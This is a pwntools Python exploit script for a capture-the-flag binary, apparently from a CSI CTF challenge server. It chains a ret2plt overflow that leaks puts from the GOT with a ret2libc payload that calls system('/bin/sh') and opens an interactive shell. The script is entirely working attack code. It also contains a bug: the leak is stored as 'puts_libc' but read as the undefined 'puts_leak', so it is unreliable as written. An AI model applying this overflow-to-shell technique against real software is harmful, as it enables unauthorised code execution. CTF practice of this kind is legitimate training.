from pwn import *

elf = context.binary = ELF('./hello')

# Adapt for remote
if args.REMOTE:
    libc = ELF('./libc-remote.so')
    p = remote('chall.csivit.com', 30046)
else:
    libc = elf.libc
    p = elf.process()


# ret2plt
p.clean(1)

payload = flat(
    b'A' * 136,
    elf.plt['puts'],
    elf.symbols['main'],        # 32-bit - return address comes directly after the function call
    elf.got['puts']             # Parameter comes after the return address
)

p.sendline(payload)

p.recvline()                    # This is the 'Hello, <>!' string - we don't need this

puts_libc = u32(p.recv(4))      # The puts call. We only need the first 4 bytes (the GOT entry of puts)
log.success(f'Puts@LIBC: {hex(puts_libc)}')

libc.address = puts_leak - libc.symbols['puts']
log.success(f'Libc base: {hex(libc.address)}')

p.clean(1)

# Final ret2libc
payload = flat(
    b'A' * 136,
    libc.symbols['system'],
    libc.symbols['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)
p.interactive()
